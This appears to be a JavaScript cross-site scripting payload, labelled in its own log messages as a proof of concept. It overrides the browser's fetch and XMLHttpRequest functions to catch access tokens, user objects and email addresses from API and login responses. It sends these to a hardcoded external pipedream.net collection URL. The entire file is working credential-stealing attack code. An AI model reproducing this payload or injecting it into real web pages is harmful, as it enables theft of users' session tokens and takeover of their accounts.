(function() {
    // ===== CONFIGURATION =====
    var EXFIL_URL = 'https://6b884da34ac52d711d2d20ef6f2bf068.m.pipedream.net';
    // =========================

    function exfiltrate(data) {
        // Try sendBeacon first; fallback to fetch with keepalive
        try {
            navigator.sendBeacon(EXFIL_URL, JSON.stringify(data));
        } catch (e) {
            fetch(EXFIL_URL, {
                method: 'POST',
                body: JSON.stringify(data),
                headers: { 'Content-Type': 'application/json' },
                keepalive: true
            }).catch(function(err) {
                // If both fail, at least log to console for PoC
                console.error('[XSS] Exfil failed:', err);
            });
        }
        // Always log to console for proof (visible in dev tools)
        console.log('[XSS] Token stolen:', data.token);
    }

    // --- Hook fetch() ---
    var originalFetch = window.fetch;
    window.fetch = function() {
        var args = arguments;
        return originalFetch.apply(this, args).then(function(response) {
            var clone = response.clone();
            clone.json().then(function(data) {
                if (data && data.access_token) {
                    exfiltrate({
                        token: data.access_token,
                        user: data.user,
                        email: data.user ? data.user.email : null,
                        timestamp: new Date().toISOString(),
                        source: 'fetch'
                    });
                }
            }).catch(function() {});
            return response;
        });
    };

    // --- Hook XMLHttpRequest ---
    var originalOpen = XMLHttpRequest.prototype.open;
    var originalSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(method, url) {
        this._url = url;
        return originalOpen.apply(this, arguments);
    };

    XMLHttpRequest.prototype.send = function(body) {
        var self = this;
        this.addEventListener('load', function() {
            if (self._url && self._url.indexOf('/api/auth/login') !== -1 && self.status === 200) {
                try {
                    var data = JSON.parse(self.responseText);
                    if (data && data.access_token) {
                        exfiltrate({
                            token: data.access_token,
                            user: data.user,
                            email: data.user ? data.user.email : null,
                            timestamp: new Date().toISOString(),
                            source: 'xhr'
                        });
                    }
                } catch(e) {}
            }
        });
        return originalSend.apply(this, arguments);
    };

    console.log('[XSS] Payload loaded – token interceptor installed.');
})();
